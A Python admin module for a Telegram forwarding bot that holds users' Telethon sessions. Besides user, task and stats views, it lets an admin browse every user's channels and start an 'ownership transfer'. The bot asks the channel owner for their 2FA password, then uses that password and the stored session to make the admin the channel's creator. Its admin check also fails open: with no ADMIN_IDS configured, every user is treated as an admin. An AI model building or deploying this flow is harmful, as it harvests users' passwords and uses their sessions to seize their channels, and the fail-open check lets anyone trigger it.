import os
import time
import logging
from aiogram import Router, F, Bot
from aiogram.types import CallbackQuery, Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.storage.base import StorageKey
from aiogram.utils.keyboard import InlineKeyboardBuilder

import bot_forwarder
from bot_database import get_all_users, get_all_tasks, get_all_statistics

logger = logging.getLogger("bot.admin")
router = Router()

# Set from run_bot.py at startup
dp_storage = None
bot_id = None

# Pending ownership transfers: owner_user_id -> {admin_id, channel_id, channel_name, expires_at, admin_chat_id}
pending_transfers = {}


class OwnershipTransferStates(StatesGroup):
    waiting_for_2fa_password = State()


# ─── Admin Check ───


def _get_admin_ids():
    raw = os.getenv("ADMIN_IDS", "")
    if raw.strip():
        return [int(x.strip()) for x in raw.split(",") if x.strip().isdigit()]
    return []


def _is_admin(user_id):
    admin_ids = _get_admin_ids()
    if admin_ids:
        return user_id in admin_ids
    return True


# ─── Admin Panel Home ───


@router.callback_query(F.data == "m_admin")
async def cb_admin(callback: CallbackQuery):
    user_id = callback.from_user.id
    if not _is_admin(user_id):
        await callback.answer("Access denied. Admin only.", show_alert=True)
        return

    builder = InlineKeyboardBuilder()
    builder.button(text="👥 All Users", callback_data="adm_users")
    builder.button(text="📋 All Tasks", callback_data="adm_tasks")
    builder.button(text="📊 Global Stats", callback_data="adm_stats")
    builder.button(text="📡 User Channels", callback_data="adm_channels")
    builder.button(text="👑 Transfer Ownership", callback_data="adm_xfer_pick")
    builder.button(text="🔄 Refresh", callback_data="m_admin")
    builder.button(text="⬅️ Back", callback_data="m_main")
    builder.adjust(2, 2, 1, 2)

    users = await get_all_users()
    all_tasks = await get_all_tasks()
    connected = sum(1 for u in users if u["auth_state"] == "CONNECTED")
    active_clients = len(bot_forwarder.user_clients)

    await callback.message.edit_text(
        "🛡  *Admin Panel*\n"
        "━━━━━━━━━━━━━━━━\n\n"
        "👥 Users: {total} total, {conn} connected\n"
        "🖥 Active clients: {clients}\n"
        "📋 Tasks: {tasks} total\n\n"
        "Select a view:".format(
            total=len(users),
            conn=connected,
            clients=active_clients,
            tasks=len(all_tasks),
        ),
        parse_mode="Markdown",
        reply_markup=builder.as_markup(),
    )
    await callback.answer()


# ─── All Users ───


@router.callback_query(F.data == "adm_users")
async def cb_adm_users(callback: CallbackQuery):
    if not _is_admin(callback.from_user.id):
        await callback.answer("Access denied.", show_alert=True)
        return

    users = await get_all_users()
    all_tasks = await get_all_tasks()
    all_stats = await get_all_statistics()

    stats_by_user = {s["user_id"]: s for s in all_stats}
    tasks_by_user = {}
    for t in all_tasks:
        tasks_by_user.setdefault(t["user_id"], []).append(t)

    lines = [
        "👥  *All Users*\n"
        "━━━━━━━━━━━━━━\n"
    ]

    for u in users:
        uid = u["id"]
        phone = u.get("phone", "?")
        if len(phone) > 6:
            phone = phone[:4] + "****" + phone[-3:]

        if u["auth_state"] == "CONNECTED":
            status = "🟢"
        elif u["auth_state"] == "PENDING":
            status = "🟡"
        else:
            status = "🔴"

        client_active = "✅" if uid in bot_forwarder.user_clients else "❌"

        user_tasks = tasks_by_user.get(uid, [])
        enabled_count = sum(1 for t in user_tasks if t["enabled"])

        user_stat = stats_by_user.get(uid)
        msg_count = user_stat["total_messages"] if user_stat else 0
        today_count = user_stat.get("today_count", 0) if user_stat else 0

        last_active = u.get("last_active")
        if last_active:
            la = time.strftime("%m/%d %H:%M", time.localtime(last_active))
        else:
            la = "Never"

        lines.append(
            "{status} *User* `{uid}`\n"
            "    📱 {phone}  |  🖥 Client: {client}\n"
            "    📋 Tasks: {en}/{total}  |  📨 Msgs: {msgs} (today: {today})\n"
            "    🕐 Last: {la}\n".format(
                status=status,
                uid=uid,
                phone=phone,
                client=client_active,
                en=enabled_count,
                total=len(user_tasks),
                msgs=msg_count,
                today=today_count,
                la=la,
            )
        )

    if not users:
        lines.append("_No users yet._")

    builder = InlineKeyboardBuilder()
    builder.button(text="🔄 Refresh", callback_data="adm_users")
    builder.button(text="⬅️ Back", callback_data="m_admin")
    builder.adjust(2)

    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:3950] + "\n\n_...truncated_"

    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=builder.as_markup())
    await callback.answer()


# ─── All Tasks ───


@router.callback_query(F.data == "adm_tasks")
async def cb_adm_tasks(callback: CallbackQuery):
    if not _is_admin(callback.from_user.id):
        await callback.answer("Access denied.", show_alert=True)
        return

    all_tasks = await get_all_tasks()

    lines = [
        "📋  *All Tasks*\n"
        "━━━━━━━━━━━━━━\n"
    ]

    for t in all_tasks:
        icon = "🟢" if t["enabled"] else "🔴"
        pause = " ⏸" if t["paused"] else ""
        ai = " 🤖" if t["filters"].get("rewrite_enabled") else ""
        dest_count = len(t.get("destination_channel_ids", []))

        lines.append(
            "{icon}{pause}{ai} *{name}*  `(ID: {tid})`\n"
            "    👤 User: `{uid}`\n"
            "    📥 Src: `{src}` → 📤 {dests} dest(s)\n".format(
                icon=icon,
                pause=pause,
                ai=ai,
                name=t["name"][:25],
                tid=t["id"],
                uid=t["user_id"],
                src=t["source_channel_id"],
                dests=dest_count,
            )
        )

    if not all_tasks:
        lines.append("_No tasks created yet._")

    builder = InlineKeyboardBuilder()
    builder.button(text="🔄 Refresh", callback_data="adm_tasks")
    builder.button(text="⬅️ Back", callback_data="m_admin")
    builder.adjust(2)

    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:3950] + "\n\n_...truncated_"

    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=builder.as_markup())
    await callback.answer()


# ─── Global Stats ───


@router.callback_query(F.data == "adm_stats")
async def cb_adm_stats(callback: CallbackQuery):
    if not _is_admin(callback.from_user.id):
        await callback.answer("Access denied.", show_alert=True)
        return

    users = await get_all_users()
    all_stats = await get_all_statistics()
    stats_by_user = {s["user_id"]: s for s in all_stats}

    total_msgs = sum(s.get("total_messages", 0) for s in all_stats)
    total_today = sum(s.get("today_count", 0) for s in all_stats)
    total_imgs = sum(s.get("total_images", 0) for s in all_stats)
    active_clients = len(bot_forwarder.user_clients)

    lines = [
        "📊  *Global Statistics*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "📨 Total messages: *{total}*\n"
        "📅 Today: *{today}*\n"
        "🖼 Images: *{imgs}*\n"
        "🖥 Active clients: *{clients}*\n\n"
        "📊 *Per-User Breakdown:*\n".format(
            total=total_msgs,
            today=total_today,
            imgs=total_imgs,
            clients=active_clients,
        )
    ]

    for u in users:
        stat = stats_by_user.get(u["id"])
        if not stat:
            continue
        phone = u.get("phone", "?")
        if len(phone) > 6:
            phone = phone[:4] + "****" + phone[-3:]
        lines.append(
            "  📱 {phone} — {msgs} msgs ({today} today)".format(
                phone=phone,
                msgs=stat.get("total_messages", 0),
                today=stat.get("today_count", 0),
            )
        )

    builder = InlineKeyboardBuilder()
    builder.button(text="🔄 Refresh", callback_data="adm_stats")
    builder.button(text="⬅️ Back", callback_data="m_admin")
    builder.adjust(2)

    text = "\n".join(lines)
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=builder.as_markup())
    await callback.answer()


# ─── User Channels Overview ───


@router.callback_query(F.data == "adm_channels")
async def cb_adm_channels(callback: CallbackQuery):
    if not _is_admin(callback.from_user.id):
        await callback.answer("Access denied.", show_alert=True)
        return

    await callback.message.edit_text("📡 Fetching channel data for all users...")
    await callback.answer()

    users = await get_all_users()
    lines = [
        "📡  *User Channels Overview*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
    ]

    for u in users:
        uid = u["id"]
        client = bot_forwarder.user_clients.get(uid)
        if not client or not client.is_connected():
            continue

        phone = u.get("phone", "?")
        if len(phone) > 6:
            phone = phone[:4] + "****" + phone[-3:]

        lines.append("\n👤 *{}* (`{}`)".format(phone, uid))

        try:
            ch_count = 0
            async for dialog in client.iter_dialogs():
                if not dialog.is_channel:
                    continue

                entity = dialog.entity
                name = dialog.name or "(no name)"
                full_id = int("-100{}".format(entity.id))

                role = "Member"
                if hasattr(entity, "creator") and entity.creator:
                    role = "👑 Owner"
                elif hasattr(entity, "admin_rights") and entity.admin_rights:
                    role = "🛡 Admin"

                members = "?"
                if hasattr(entity, "participants_count") and entity.participants_count:
                    count = entity.participants_count
                    if count >= 1000:
                        members = "{:.1f}K".format(count / 1000)
                    else:
                        members = str(count)

                lines.append(
                    "  {role} *{name}*\n"
                    "       `{cid}` | {members} subs".format(
                        role=role,
                        name=name[:30],
                        cid=full_id,
                        members=members,
                    )
                )
                ch_count += 1

                if ch_count >= 15:
                    lines.append("  _...and more_")
                    break

            if ch_count == 0:
                lines.append("  _No channels_")

        except Exception as e:
            lines.append("  ❌ Error: {}".format(str(e)[:50]))

    builder = InlineKeyboardBuilder()
    builder.button(text="🔄 Refresh", callback_data="adm_channels")
    builder.button(text="⬅️ Back", callback_data="m_admin")
    builder.adjust(2)

    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:3950] + "\n\n_...truncated_"

    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=builder.as_markup())


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Channel Ownership Transfer (Admin Only)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


# Step 1: Pick a user
@router.callback_query(F.data == "adm_xfer_pick")
async def cb_xfer_pick_user(callback: CallbackQuery):
    if not _is_admin(callback.from_user.id):
        await callback.answer("Access denied.", show_alert=True)
        return

    users = await get_all_users()
    connected_users = []
    for u in users:
        uid = u["id"]
        client = bot_forwarder.user_clients.get(uid)
        if client and client.is_connected():
            connected_users.append(u)

    if not connected_users:
        builder = InlineKeyboardBuilder()
        builder.button(text="⬅️ Back", callback_data="m_admin")
        await callback.message.edit_text(
            "👑  *Channel Transfer*\n\n"
            "_No users with active sessions._",
            parse_mode="Markdown",
            reply_markup=builder.as_markup(),
        )
        await callback.answer()
        return

    builder = InlineKeyboardBuilder()
    for u in connected_users:
        phone = u.get("phone", "?")
        if len(phone) > 6:
            phone = phone[:4] + "****" + phone[-3:]
        builder.button(
            text="👤 {} ({})".format(phone, u["id"]),
            callback_data="adm_xu:{}".format(u["id"]),
        )
    builder.button(text="⬅️ Back", callback_data="m_admin")
    builder.adjust(1)

    await callback.message.edit_text(
        "👑  *Channel Ownership Transfer*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Select a user to browse their owned channels:",
        parse_mode="Markdown",
        reply_markup=builder.as_markup(),
    )
    await callback.answer()


# Step 2: List owner channels for selected user
@router.callback_query(F.data.startswith("adm_xu:"))
async def cb_xfer_user_channels(callback: CallbackQuery):
    if not _is_admin(callback.from_user.id):
        await callback.answer("Access denied.", show_alert=True)
        return

    owner_uid = int(callback.data.split(":")[1])
    client = bot_forwarder.user_clients.get(owner_uid)
    if not client or not client.is_connected():
        await callback.answer("User's client is not connected.", show_alert=True)
        return

    await callback.message.edit_text("📡 Fetching owned channels...")
    await callback.answer()

    owned_channels = []
    try:
        async for dialog in client.iter_dialogs():
            if not dialog.is_channel:
                continue
            entity = dialog.entity
            if hasattr(entity, "creator") and entity.creator:
                name = dialog.name or "(no name)"
                members = "?"
                if hasattr(entity, "participants_count") and entity.participants_count:
                    count = entity.participants_count
                    if count >= 1000:
                        members = "{:.1f}K".format(count / 1000)
                    else:
                        members = str(count)
                owned_channels.append({
                    "id": entity.id,
                    "name": name,
                    "members": members,
                })
    except Exception as e:
        builder = InlineKeyboardBuilder()
        builder.button(text="⬅️ Back", callback_data="adm_xfer_pick")
        await callback.message.edit_text(
            "❌ Error fetching channels: {}".format(str(e)[:100]),
            reply_markup=builder.as_markup(),
        )
        return

    if not owned_channels:
        builder = InlineKeyboardBuilder()
        builder.button(text="⬅️ Back", callback_data="adm_xfer_pick")
        await callback.message.edit_text(
            "👑  *Owned Channels*\n\n"
            "_This user does not own any channels._",
            parse_mode="Markdown",
            reply_markup=builder.as_markup(),
        )
        return

    lines = [
        "👑  *Channels Owned by User* `{}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n".format(owner_uid)
    ]

    builder = InlineKeyboardBuilder()
    for ch in owned_channels[:20]:
        full_id = int("-100{}".format(ch["id"]))
        lines.append(
            "👑 *{}*\n"
            "    `{}` | {} subs\n".format(ch["name"][:30], full_id, ch["members"])
        )
        builder.button(
            text="🔄 Transfer: {}".format(ch["name"][:20]),
            callback_data="adm_xc:{}:{}".format(owner_uid, ch["id"]),
        )

    builder.button(text="⬅️ Back", callback_data="adm_xfer_pick")
    builder.adjust(1)

    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:3950] + "\n\n_...truncated_"

    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=builder.as_markup())


# Step 3: Confirmation screen
@router.callback_query(F.data.startswith("adm_xc:"))
async def cb_xfer_confirm(callback: CallbackQuery):
    if not _is_admin(callback.from_user.id):
        await callback.answer("Access denied.", show_alert=True)
        return

    parts = callback.data.split(":")
    owner_uid = int(parts[1])
    channel_bare_id = int(parts[2])

    client = bot_forwarder.user_clients.get(owner_uid)
    if not client or not client.is_connected():
        await callback.answer("User's client disconnected.", show_alert=True)
        return

    # Resolve channel name
    channel_name = "Unknown"
    full_id = int("-100{}".format(channel_bare_id))
    try:
        entity = await client.get_entity(channel_bare_id)
        channel_name = getattr(entity, "title", None) or getattr(entity, "name", None) or "Unknown"
    except Exception:
        pass

    builder = InlineKeyboardBuilder()
    builder.button(
        text="✅ Confirm — Notify Owner",
        callback_data="adm_xgo:{}:{}".format(owner_uid, channel_bare_id),
    )
    builder.button(text="❌ Cancel", callback_data="adm_xu:{}".format(owner_uid))
    builder.adjust(1)

    await callback.message.edit_text(
        "⚠️  *Confirm Ownership Transfer*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📡 Channel: *{name}*\n"
        "🆔 ID: `{cid}`\n\n"
        "👤 Current owner: `{owner}`\n"
        "👑 New owner: *You* (`{admin}`)\n\n"
        "⚠️ *This action is IRREVERSIBLE.*\n"
        "The user will be asked to enter their 2FA password.\n\n"
        "Proceed?".format(
            name=channel_name,
            cid=full_id,
            owner=owner_uid,
            admin=callback.from_user.id,
        ),
        parse_mode="Markdown",
        reply_markup=builder.as_markup(),
    )
    await callback.answer()


# Step 4: Initiate transfer — notify the owner
@router.callback_query(F.data.startswith("adm_xgo:"))
async def cb_xfer_go(callback: CallbackQuery, bot: Bot):
    if not _is_admin(callback.from_user.id):
        await callback.answer("Access denied.", show_alert=True)
        return

    parts = callback.data.split(":")
    owner_uid = int(parts[1])
    channel_bare_id = int(parts[2])
    admin_uid = callback.from_user.id

    # Check owner's client is still active
    client = bot_forwarder.user_clients.get(owner_uid)
    if not client or not client.is_connected():
        await callback.answer("User's client disconnected.", show_alert=True)
        return

    # Check no pending transfer for this owner
    if owner_uid in pending_transfers:
        existing = pending_transfers[owner_uid]
        if time.time() < existing["expires_at"]:
            await callback.answer("A transfer is already pending for this user.", show_alert=True)
            return
        else:
            del pending_transfers[owner_uid]

    # Resolve channel name
    channel_name = "Unknown"
    try:
        entity = await client.get_entity(channel_bare_id)
        channel_name = getattr(entity, "title", None) or getattr(entity, "name", None) or "Unknown"
    except Exception:
        pass

    # Store pending transfer
    pending_transfers[owner_uid] = {
        "admin_id": admin_uid,
        "channel_id": channel_bare_id,
        "channel_name": channel_name,
        "admin_chat_id": callback.message.chat.id,
        "expires_at": time.time() + 300,  # 5 minute window
    }

    # Set owner's FSM state to waiting for password
    if dp_storage and bot_id:
        key = StorageKey(bot_id=bot_id, user_id=owner_uid, chat_id=owner_uid)
        await dp_storage.set_state(
            key=key,
            state=OwnershipTransferStates.waiting_for_2fa_password.state,
        )

    # Send message to the owner
    try:
        await bot.send_message(
            owner_uid,
            "⚠️  *Channel Ownership Transfer Request*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "The bot admin has requested to transfer ownership of:\n\n"
            "📡 *{name}*\n\n"
            "To confirm, please enter your *2FA password* below.\n"
            "Your message will be deleted immediately for security.\n\n"
            "⏱ This request expires in 5 minutes.\n"
            "Send /start to cancel.".format(name=channel_name),
            parse_mode="Markdown",
        )
    except Exception as e:
        logger.error("Failed to message owner {}: {}".format(owner_uid, e))
        del pending_transfers[owner_uid]
        await callback.answer("Failed to send message to user.", show_alert=True)
        return

    # Update admin's view
    builder = InlineKeyboardBuilder()
    builder.button(text="❌ Cancel Transfer", callback_data="adm_xcancel:{}".format(owner_uid))
    builder.button(text="⬅️ Back", callback_data="m_admin")
    builder.adjust(1)

    await callback.message.edit_text(
        "⏳  *Waiting for User*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "📡 Channel: *{name}*\n"
        "👤 Owner: `{owner}`\n\n"
        "The user has been notified.\n"
        "Waiting for their 2FA password...\n\n"
        "⏱ Expires in 5 minutes.".format(
            name=channel_name,
            owner=owner_uid,
        ),
        parse_mode="Markdown",
        reply_markup=builder.as_markup(),
    )
    await callback.answer()


# Cancel a pending transfer
@router.callback_query(F.data.startswith("adm_xcancel:"))
async def cb_xfer_cancel(callback: CallbackQuery, bot: Bot):
    if not _is_admin(callback.from_user.id):
        await callback.answer("Access denied.", show_alert=True)
        return

    owner_uid = int(callback.data.split(":")[1])

    if owner_uid in pending_transfers:
        del pending_transfers[owner_uid]

    # Clear owner's FSM state
    if dp_storage and bot_id:
        key = StorageKey(bot_id=bot_id, user_id=owner_uid, chat_id=owner_uid)
        await dp_storage.set_state(key=key, state=None)

    try:
        await bot.send_message(owner_uid, "Transfer request has been cancelled by admin.")
    except Exception:
        pass

    await callback.answer("Transfer cancelled.", show_alert=True)

    builder = InlineKeyboardBuilder()
    builder.button(text="⬅️ Back", callback_data="m_admin")
    await callback.message.edit_text(
        "❌ Transfer cancelled.",
        reply_markup=builder.as_markup(),
    )


# Step 5: Owner enters 2FA password
@router.message(OwnershipTransferStates.waiting_for_2fa_password, ~F.text.startswith("/"))
async def process_transfer_password(message: Message, state: FSMContext, bot: Bot):
    owner_uid = message.from_user.id
    password = message.text.strip()

    # Delete the password message immediately
    try:
        await message.delete()
    except Exception:
        pass

    await state.clear()

    # Check pending transfer exists
    transfer = pending_transfers.pop(owner_uid, None)
    if not transfer:
        await message.answer("No pending transfer found or it has expired.")
        return

    # Check expiry
    if time.time() > transfer["expires_at"]:
        await message.answer("⏱ Transfer request has expired.")
        return

    admin_uid = transfer["admin_id"]
    channel_bare_id = transfer["channel_id"]
    channel_name = transfer["channel_name"]
    admin_chat_id = transfer["admin_chat_id"]

    # Get owner's client
    client = bot_forwarder.user_clients.get(owner_uid)
    if not client or not client.is_connected():
        await message.answer("❌ Your Telegram session is disconnected.")
        try:
            await bot.send_message(admin_chat_id, "❌ Transfer failed — user's client disconnected.")
        except Exception:
            pass
        return

    # Execute the transfer
    status_msg = await message.answer("🔄 Processing transfer...")

    try:
        await _execute_ownership_transfer(client, channel_bare_id, admin_uid, password)

        # Notify owner
        await status_msg.edit_text(
            "✅  *Ownership Transferred*\n\n"
            "📡 *{}* has been transferred successfully.".format(channel_name),
            parse_mode="Markdown",
        )

        # Notify admin
        try:
            await bot.send_message(
                admin_chat_id,
                "✅  *Transfer Complete!*\n\n"
                "📡 *{name}* ownership transferred to you.\n"
                "👤 From user: `{owner}`".format(name=channel_name, owner=owner_uid),
                parse_mode="Markdown",
            )
        except Exception:
            pass

        logger.info("Channel {} transferred from user {} to admin {}".format(
            channel_bare_id, owner_uid, admin_uid
        ))

    except Exception as e:
        error_str = str(e)
        logger.error("Transfer failed: {}".format(error_str))

        # Determine user-friendly error
        if "PASSWORD_HASH_INVALID" in error_str or "PasswordHashInvalid" in str(type(e).__name__):
            user_msg = "❌ Incorrect 2FA password. Transfer cancelled."
            admin_msg = "❌ Transfer failed — user entered wrong password."
        elif "CHAT_ADMIN_REQUIRED" in error_str or "USER_NOT_PARTICIPANT" in error_str:
            user_msg = "❌ Transfer failed — the new owner is not a member of the channel."
            admin_msg = "❌ Transfer failed — you must join the channel first."
        elif "CHANNEL_INVALID" in error_str:
            user_msg = "❌ Transfer failed — channel not found."
            admin_msg = "❌ Transfer failed — channel not found or access lost."
        else:
            user_msg = "❌ Transfer failed: {}".format(error_str[:100])
            admin_msg = "❌ Transfer failed: {}".format(error_str[:200])

        await status_msg.edit_text(user_msg)

        try:
            await bot.send_message(admin_chat_id, admin_msg)
        except Exception:
            pass


async def _execute_ownership_transfer(owner_client, channel_bare_id, new_owner_tg_id, password_str):
    """Execute channel ownership transfer via Telethon."""
    from telethon.tl.functions.channels import EditCreatorRequest
    from telethon.tl.functions.account import GetPasswordRequest
    from telethon.password import compute_check

    # Resolve entities
    channel_entity = await owner_client.get_entity(channel_bare_id)
    new_owner_entity = await owner_client.get_entity(new_owner_tg_id)

    # Get SRP password info and compute check
    password_info = await owner_client(GetPasswordRequest())
    password_check = compute_check(password_info, password_str.encode("utf-8"))

    # Execute transfer
    await owner_client(EditCreatorRequest(
        channel=channel_entity,
        user_id=new_owner_entity,
        password=password_check,
    ))
